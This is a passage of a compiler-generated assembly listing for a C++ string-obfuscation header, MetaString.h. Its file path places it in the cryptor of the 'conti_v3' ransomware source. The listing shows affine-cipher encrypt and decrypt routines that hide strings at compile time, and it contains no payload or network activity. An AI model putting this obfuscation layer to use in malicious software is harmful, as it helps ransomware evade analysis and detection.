; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00185	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00189	88 85 c0 00 00
	00		 mov	 BYTE PTR tv154[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0018f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00196	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0019d	5f		 pop	 rdi
  0019e	5d		 pop	 rbp
  0019f	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 4c	 sub	 eax, 76			; 0000004cH
  0002d	6b c0 13	 imul	 eax, eax, 19
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 6b	 imul	 eax, eax, 107		; 0000006bH
  0002d	83 c0 4c	 add	 eax, 76			; 0000004cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
